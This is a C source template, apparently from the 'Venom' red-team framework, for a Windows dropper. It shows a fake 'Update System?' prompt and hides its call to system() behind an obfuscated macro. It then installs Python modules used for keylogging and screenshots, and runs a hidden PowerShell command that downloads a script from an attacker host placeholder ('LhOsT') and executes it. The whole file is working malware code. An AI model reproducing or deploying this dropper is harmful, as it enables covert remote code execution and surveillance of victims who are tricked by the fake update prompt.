/*
Author: r00t-3xp10it (SSA RedTeam @2020)
Framework: Venom v1.0.17.4 - shinigami
Function: This template its used to download/exec (Client.py) from attacker machine (LAN)
Mandatory dependencies: python3 and pip {tabulate pynput psutil pillow pyscreenshot pyinstaller}
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

#define _____(d,y,i,o,q,h)(i##d##h##y##o##q)
#define _ _____(y,t,s,e,m,s)

int main()
{
 MessageBox(NULL, "Update System?", "FiLNaMe", MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1 | MB_SETFOREGROUND);
 _("powershell $C=pip show tabulate;If(-not($C)){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}");
 _("powershell -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.py', 'TempDir\\FiLNaMe.py') && cd TempDir && python FiLNaMe.py");
 return 0;
}
